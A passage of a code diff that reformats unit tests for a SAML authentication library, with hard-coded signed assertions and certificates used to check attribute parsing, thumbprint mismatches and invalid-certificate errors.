  checkExpiration: false,\n+        }); // dont check expiration since we are harcoding the token\n+        var profile = saml_passport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (error, profile) {\n+                assert.ok(profile);\n+                done();\n+            }\n         );\n-        assert.ok(\n-          errorMessages.includes(err.message),\n-          \"Error message for invalid certificate is incorrect\"\n+    });\n+\n+    it(\"should return error if validation fails\", function (done) {\n+        var signedAssertion =\n+            '<Assertion ID=\"_1b1ffaef-86ef-42e1-92cf-cf8c9d9a4ce0\" IssueInstant=\"2013-04-02T18:50:24.000Z\" Version=\"2.0\" xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\"><Issuer>https://sts.windows.net/75696069-df44-4310-9bcf-08b45e3007c9/</Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /><ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\" /><ds:Reference URI=\"#_1b1ffaef-86ef-42e1-92cf-cf8c9d9a4ce0\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\" /><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\" /><ds:DigestValue>TzJmLs0BTPgpaPLsA7L2Kd9l1k4IBOmwIM/znV2iOPU=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>OHJCAffCNPRkwsE3RqnVPoCRSqsPrio8prABauzu2pqF418Y1QJuJehhzztY8A6kwnBUkBVE7BIyLe7kgCnBoNZWElYki1xtaLksc/Afc0TjlZvv9IJ9fQHIBiL1JA9KcySq1tu9dv/NauykBODXuljPuVTk6I4xLLWcg20o26Ov57axp42uWPpcJHtasomLmmmnAXEh6P7aB/1Vlm/MAJhWXToxacauJzFao3F9JNEuucKY6y3RPDp1Qq3vL0gq98RKuiaejayu6RjyyU2+8vCBzURul8b7ZXPUHfIOME6Q5LvbKqLhe/mzqRc+9GUg22X3B5SYjdnXjwHbBTbihA==</ds:SignatureValue><KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><X509Data><X509Certificate>MIIDPjCCAiqgAwIBAgIQVWmXY/+9RqFA/OG9kFulHDAJBgUrDgMCHQUAMC0xKzApBgNVBAMTImFjY291bnRzLmFjY2Vzc2NvbnRyb2wud2luZG93cy5uZXQwHhcNMTIwNjA3MDcwMDAwWhcNMTQwNjA3MDcwMDAwWjAtMSswKQYDVQQDEyJhY2NvdW50cy5hY2Nlc3Njb250cm9sLndpbmRvd3MubmV0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArCz8Sn3GGXmikH2MdTeGY1D711EORX/lVXpr+ecGgqfUWF8MPB07XkYuJ54DAuYT318+2XrzMjOtqkT94VkXmxv6dFGhG8YZ8vNMPd4tdj9c0lpvWQdqXtL1TlFRpD/P6UMEigfN0c9oWDg9U7Ilymgei0UXtf1gtcQbc5sSQU0S4vr9YJp2gLFIGK11Iqg4XSGdcI0QWLLkkC6cBukhVnd6BCYbLjTYy3fNs4DzNdemJlxGl8sLexFytBF6YApvSdus3nFXaMCtBGx16HzkK9ne3lobAwL2o79bP4imEGqg+ibvyNmbrwFGnQrBc1jTF9LyQX9q+louxVfHs6ZiVwIDAQABo2IwYDBeBgNVHQEEVzBVgBCxDDsLd8xkfOLKm4Q/SzjtoS8wLTErMCkGA1UEAxMiYWNjb3VudHMuYWNjZXNzY29udHJvbC53aW5kb3dzLm5ldIIQVWmXY/+9RqFA/OG9kFulHDAJBgUrDgMCHQUAA4IBAQAkJtxxm/ErgySlNk69+1odTMP8Oy6L0H17z7XGG3w4TqvTUSWaxD4hSFJ0e7mHLQLQD7oV/erACXwSZn2pMoZ89MBDjOMQA+e6QzGB7jmSzPTNmQgMLA8fWCfqPrz6zgH+1F1gNp8hJY57kfeVPBiyjuBmlTEBsBlzolY9dd/55qqfQk6cgSeCbHCy/RU/iep0+UsRMlSgPNNmqhj5gmN2AFVCN96zF694LwuPae5CeR2ZcVknexOWHYjFM0MgUSw0ubnGl0h9AJgGyhvNGcjQqu9vd1xkupFgaN+f7P3p3EVN5csBg5H94jEcQZT7EKeTiZ6bTrpDAnrr8tDCy8ng</X509Certificate></X509Data></KeyInfo></ds:Signature><Subject><NameID>10030000838D23AF@MicrosoftOnline.com</NameID><SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\" /></Subject><Conditions NotBefore=\"2013-04-02T18:50:23.969Z\" NotOnOrAfter=\"2013-04-03T06:50:23.969Z\"><AudienceRestriction><Audience>spn:408153f4-5960-43dc-9d4f-6b717d772c8d</Audience></AudienceRestriction></Conditions><AttributeStatement><Attribute Name=\"http://schemas.microsoft.com/identity/claims/tenantid\"><AttributeValue>75696069-df44-4310-9bcf-08b45e3007c9</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname\"><AttributeValue>Matias</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><AttributeValue>matias@auth0.onmicrosoft.com</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname\"><AttributeValue>Woloski</AttributeValue></Attribute><Attribute Name=\"http://schemas.microsoft.com/identity/claims/identityprovider\"><AttributeValue>https://sts.windows.net/75696069-df44-4310-9bcf-08b45e3007c9/</AttributeValue></Attribute></AttributeStatement><AuthnStatement AuthnInstant=\"2013-04-02T18:50:16.000Z\"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion>';\n+\n+        var saml_passport = new SamlPassport({\n+            thumbprints: [\n+                \"3464c5bdd2be7f2b6112e2f08e9c0024e33d9fe1\",\n+                \"3464c5bdd2be7f2b6112e2f08e9c0024e33d9fe2\",\n+            ], // WRONG thumbprints\n+            realm: \"spn:408153f4-5960-43dc-9d4f-6b717d772c8d\",\n+            checkRecipient: false,\n+            checkExpiration: false,\n+        }); // dont check expiration since we are harcoding the token\n+        var profile = saml_passport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (error, profile) {\n+                assert.equal(\n+                    \"Invalid thumbprint (configured: 3464C5BDD2BE7F2B6112E2F08E9C0024E33D9FE1, 3464C5BDD2BE7F2B6112E2F08E9C0024E33D9FE2. calculated: 3464C5BDD2BE7F2B6112E2F08E9C0024E33D9FE0)\",\n+                    error.message\n+                );\n+                done();\n+            }\n         );\n+    });\n \n-        done();\n-      }\n-    );\n-  });\n-});\n+    it(\"should fail when the X509Certificate is invalid\", function (done) {\n+        const signedAssertion = fs\n+            .readFileSync(\n+                __dirname + \"/samples/plain/samlresponse_saml11_invalid_cert.txt\"\n+            )\n+            .toString();\n+        const options = {\n+            checkDestination: false,\n+            thumbprint: \"CDADA32647511D5F0E4676DE2DD8EE3FAD1F6D2D\",\n+        };\n+\n+        const saml_passport = new SamlPassport(options);\n+        saml_passport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                const errorMessages = [\n+                    \"The signing certificate is invalid (PEM_read_bio_PUBKEY failed)\",\n+                    \"The signing certificate is invalid (error:0906700D:PEM routines:PEM_ASN1_read_bio:ASN1 lib, error:0D07803A:asn1 encoding routines:ASN1_ITEM_EX_D2I:nested asn1 error, error:0D068066:asn1 encoding routines:ASN1_CHECK_TLEN:bad object header)\",\n+                    \"The signing certificate is invalid (error:0D07803A:asn1 encoding routines:asn1_item_embed_d2i:nested asn1 error, error:0D068066:asn1 encoding routines:asn1_check_tlen:bad object header)\",\n+                    \"The signing certificate is invalid (error:0688010A:asn1 encoding routines::nested asn1 error, error:06800066:asn1 encoding routines::bad object header)\",\n+                    // This is required for Node version 22\n+                    \"The signing certificate is invalid (error:1E08010C:DECODER routines::unsupported, error:0688010A:asn1 encoding routines::nested asn1 error, error:06800066:asn1 encoding routines::bad object header, error:0680009B:asn1 encoding routines::too long)\",\n+                ];\n+\n+                assert.ok(err, \"The signing certificate was unexpectedly valid\");\n+                assert.ok(\n+                    /signing certificate is invalid/.test(err.message),\n+                    \"Error message is not the default invalid message\"\n+                );\n+                assert.ok(\n+                    errorMessages.includes(err.message),\n+                    \"Error message for invalid certificate is incorrect\"\n+                );\n+\n+                done();\n+            }\n+        );\n+    });\n+});\n\\ No newline at end of file\n```\n\nFilename: test/saml20.tests.js:\n```\n@@ -6,496 +6,549 @@\nconst utils = require(\"../lib/passport-wsfed-saml2/utils\");\n const SamlPassport = require(\"../lib/passport-wsfed-saml2/saml\").SAML;\n \n describe(\"saml 2.0 assertion\", function () {\n-  // cert created with:\n-  // openssl req -x509 -new -newkey rsa:2048 -nodes -subj '/CN=auth0.auth0.com/O=Auth0 LLC/C=US/ST=Washington/L=Redmond' -keyout auth0.key -out auth0.pem\n-\n-  const options = {\n-    cert: fs.readFileSync(__dirname + \"/test-auth0.pem\"),\n-    key: fs.readFileSync(__dirname + \"/test-auth0.key\"),\n-    issuer: \"urn:issuer\",\n-    lifetimeInSeconds: 600,\n-    audiences: \"urn:myapp\",\n-    attributes: {\n-      \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\":\n-        \"foo@bar.com\",\n-      \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\": \"Foo Bar\",\n-    },\n-    nameIdentifier: \"foo\",\n-    nameIdentifierFormat:\n-      \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\",\n-  };\n-\n-  it(\"should parse attributes\", function (done) {\n-    const signedAssertion = saml20.create(options);\n-\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-    });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        if (err) return done(err);\n+    // cert created with:\n+    // openssl req -x509 -new -newkey rsa:2048 -nodes -subj '/CN=auth0.auth0.com/O=Auth0 LLC/C=US/ST=Washington/L=Redmond' -keyout auth0.key -out auth0.pem\n \n-        assert.ok(profile);\n-        assert.equal(\n-          \"foo\",\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\"\n-          ]\n-        );\n-        assert.equal(\n-          \"Foo Bar\",\n-          profile[\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"]\n-        );\n-        assert.equal(\n-          \"foo@bar.com\",\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"\n-          ]\n+    const options = {\n+        cert: fs.readFileSync(__dirname + \"/test-auth0.pem\"),\n+        key: fs.readFileSync(__dirname + \"/test-auth0.key\"),\n+        issuer: \"urn:issuer\",\n+        lifetimeInSeconds: 600,\n+        audiences: \"urn:myapp\",\n+        attributes: {\n+            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\":\n+                \"foo@bar.com\",\n+            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\": \"Foo Bar\",\n+        },\n+        nameIdentifier: \"foo\",\n+        nameIdentifierFormat:\n+            \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\",\n+    };\n+\n+    it(\"should parse attributes\", function (done) {\n+        const signedAssertion = saml20.create(options);\n+\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                if (err) return done(err);\n+\n+                assert.ok(profile);\n+                assert.equal(\n+                    \"foo\",\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\"\n+                        ]\n+                );\n+                assert.equal(\n+                    \"Foo Bar\",\n+                    profile[\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"]\n+                );\n+                assert.equal(\n+                    \"foo@bar.com\",\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"\n+                        ]\n+                );\n+                assert.equal(\"foo@bar.com\", profile[\"email\"]);\n+                assert.equal(\"urn:issuer\", profile[\"issuer\"]);\n+                done();\n+            }\n         );\n-        assert.equal(\"foo@bar.com\", profile[\"email\"]);\n-        assert.equal(\"urn:issuer\", profile[\"issuer\"]);\n-        done();\n-      }\n-    );\n-  });\n-\n-  it('should ignore the NameQualifier validation when nameid format is \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\"', function (done) {\n-    const signedAssertion =\n-      '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_ne0Z8R1z9xdbekXeWrAAg7srNB78exsb\" IssueInstant=\"2016-08-02T21:54:04.971Z\"><saml:Issuer>urn:issuer</saml:Issuer><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_ne0Z8R1z9xdbekXeWrAAg7srNB78exsb\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>p7iHnIt5xJZNimGNxh4d9R2J7DML8WNrMwMxmZ1WwSU=</DigestValue></Reference></SignedInfo><SignatureValue>pb1Wp/LFbigEj+TNm7gkAwlfIc17LNwUXVTgM8RQnMvYJfIPZbl1yo5xMCh6ObMFwCs1T+gKI5C7jMloX2QhWD/XUffBKiDfkZUg7NI/Jyt5m+Bdst12SNhHBVsNilL9ZCuf+QtQD7301gUhVHP6Ramf4y+XNod9AfzhFLYNfl6fhf/5KA/KkjiOwYW5Ps/43OMXXSeVaeQ7JRU8XqyKbwlB+YXGseFLnyZopv8Cw9Bb2935ADLX111oFBkiRhnMUJW0LMbSWM6UVJ4V0qoW9h+f3isN5+R87RECNeAQP3WSBiddnEuSdhgQYQVnb6s0mThpvs7uvIOlog0FqeSrvQ==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\" NameQualifier=\"name-qualifier\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-08-02T22:04:04.971Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-08-02T21:54:04.971Z\" NotOnOrAfter=\"2016-08-02T22:04:04.971Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-08-02T21:54:04.971Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion>';\n-\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-      checkExpiration: false,\n     });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        if (err) return done(err);\n \n-        assert.ok(profile);\n-        assert.equal(\n-          \"foo\",\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\"\n-          ]\n+    it('should ignore the NameQualifier validation when nameid format is \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\"', function (done) {\n+        const signedAssertion =\n+            '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_ne0Z8R1z9xdbekXeWrAAg7srNB78exsb\" IssueInstant=\"2016-08-02T21:54:04.971Z\"><saml:Issuer>urn:issuer</saml:Issuer><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_ne0Z8R1z9xdbekXeWrAAg7srNB78exsb\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>p7iHnIt5xJZNimGNxh4d9R2J7DML8WNrMwMxmZ1WwSU=</DigestValue></Reference></SignedInfo><SignatureValue>pb1Wp/LFbigEj+TNm7gkAwlfIc17LNwUXVTgM8RQnMvYJfIPZbl1yo5xMCh6ObMFwCs1T+gKI5C7jMloX2QhWD/XUffBKiDfkZUg7NI/Jyt5m+Bdst12SNhHBVsNilL9ZCuf+QtQD7301gUhVHP6Ramf4y+XNod9AfzhFLYNfl6fhf/5KA/KkjiOwYW5Ps/43OMXXSeVaeQ7JRU8XqyKbwlB+YXGseFLnyZopv8Cw9Bb2935ADLX111oFBkiRhnMUJW0LMbSWM6UVJ4V0qoW9h+f3isN5+R87RECNeAQP3WSBiddnEuSdhgQYQVnb6s0mThpvs7uvIOlog0FqeSrvQ==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\" NameQualifier=\"name-qualifier\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-08-02T22:04:04.971Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-08-02T21:54:04.971Z\" NotOnOrAfter=\"2016-08-02T22:04:04.971Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-08-02T21:54:04.971Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion>';\n+\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+            checkExpiration: false,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                if (err) return done(err);\n+\n+                assert.ok(profile);\n+                assert.equal(\n+                    \"foo\",\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\"\n+                        ]\n+                );\n+                assert.equal(\n+                    \"Foo Bar\",\n+                    profile[\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"]\n+                );\n+                assert.equal(\n+                    \"foo@bar.com\",\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"\n+                        ]\n+                );\n+                assert.equal(\"foo@bar.com\", profile[\"email\"]);\n+                assert.equal(\"urn:issuer\", profile[\"issuer\"]);\n+                done();\n+            }\n         );\n-        assert.equal(\n-          \"Foo Bar\",\n-          profile[\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"]\n-        );\n-        assert.equal(\n-          \"foo@bar.com\",\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"\n-          ]\n-        );\n-        assert.equal(\"foo@bar.com\", profile[\"email\"]);\n-        assert.equal(\"urn:issuer\", profile[\"issuer\"]);\n-        done();\n-      }\n-    );\n-  });\n-\n-  it('should ignore the SPNameQualifier validation when the nameid format is \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\"', function (done) {\n-    const signedAssertion =\n-      '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_nPmKm9IskDCo61hUea4DX7o3POLbLcUK\" IssueInstant=\"2016-08-02T21:59:48.654Z\"><saml:Issuer>urn:issuer</saml:Issuer><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_nPmKm9IskDCo61hUea4DX7o3POLbLcUK\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>UYsy9NacnRqnSTbidM8WBBgS+Op0G05iBJTX0T1WlUk=</DigestValue></Reference></SignedInfo><SignatureValue>VzRQaMR5Qk1P+g1tqJRKroq4JJx00FZ0rZxO4vG2gGkBXJ8262B4VUHOkxyPHNH1l/DuxSnNsL8AAbZfn8EdxMdToPvm2hkqygyA5W20o6g6eSC41rDOavTzesOKoXn3Uq9DOiUXve5ieYYCt5bQcoSCVT6uhVEKMhdcLhaB507qj9Gzcfp0E4F57ezRTTnVVEF/wCJ5j0QTMA2Wh09fxNkGijlE8KHzDJZapN4tDCzmK8qY7211gKuTfKYJGXYA4hSxw9fiQGDEPKRYA6tWf0HO5Vd8edRg2ZHr7AgjuCPp5Fj8VOP+KppA1YFBbq4Eqqt6KHg91KJlGs3ivpmwPw==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3B